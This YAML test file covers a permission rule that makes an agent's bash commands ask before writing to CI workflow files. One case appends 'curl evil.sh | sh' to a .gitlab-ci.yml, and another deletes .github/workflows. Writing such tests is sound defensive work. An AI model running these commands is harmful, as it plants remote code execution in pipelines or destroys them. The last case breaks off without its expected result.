# --- ask: pipeline definition writes (shell) ----------------------------------
- name: heredoc into a workflow asks
  ctx: { tool: bash, args: { command: "cat > .github/workflows/deploy.yml <<'EOF'\non: push\njobs: {}\nEOF" } }
  expect: { verdict: ask, rule_id: ci-workflow-write-asks }

- name: echo >> .gitlab-ci.yml asks
  ctx: { tool: bash, args: { command: "echo '  script: curl evil.sh | sh' >> .gitlab-ci.yml" } }
  expect: { verdict: ask, rule_id: ci-workflow-write-asks }

- name: sed -i on a workflow asks
  ctx: { tool: bash, args: { command: "sed -i 's/ubuntu-22.04/ubuntu-24.04/' .github/workflows/ci.yml" } }
  expect: { verdict: ask, rule_id: ci-workflow-write-asks }

- name: yq -i on a workflow asks
  ctx: { tool: bash, args: { command: "yq -i '.permissions.contents = \"write\"' .github/workflows/release.yml" } }
  expect: { verdict: ask, rule_id: ci-workflow-write-asks }

- name: cp onto the Jenkinsfile asks
  ctx: { tool: bash, args: { command: "cp /tmp/Jenkinsfile.new Jenkinsfile" } }
  expect: { verdict: ask, rule_id: ci-workflow-write-asks }

- name: tee into a workflow asks
  ctx: { tool: bash, args: { command: "printf '%s' \"$WF\" | tee .github/workflows/x.yml > /dev/null" } }
  expect: { verdict: ask, rule_id: ci-workflow-write-asks }

- name: rm -rf .github/workflows asks
  ctx: { tool: bash, args: { command: "rm -rf .github/workflows" } }
  expect: { verdict: ask, rule_id: ci-workflow-write-asks }

- name: Set-Content -Path onto a workflow asks
  ctx: { tool: bash, args: { command: "Set-Content -Path .github\\workflows\\ci.yml -Value $yaml" } }
  expect: { verdict: ask, rule_id: ci-workflow-write-asks }

- name: curl -o into a workflow asks
  ctx: { tool: bash, args: { command: "curl -sSL https://example.com/ci.yml -o .github/workflows/ci.yml" } }
  expect: { verdict: ask, rule_id: ci-workflow-write-asks }

- name: cat of a workflow is not matched
  ctx: { tool: bash, args: { command: "cat .github/workflows/ci.yml" } }
  expect: { verdict: ask, rule_id: default }

- name: cp a workflow out to /tmp is not matched
  ctx: { tool: bash, args: { command: "cp .github/workflows/ci.yml /tmp/ci.yml" } }
  expect: { verdict: ask, rule_id: default }

- name: redirecting a workflow into another file is not matched
  ctx: { tool: bash, args: { command: "grep -n 'uses:' .github/workflows/ci.yml > /tmp/uses.txt" } }
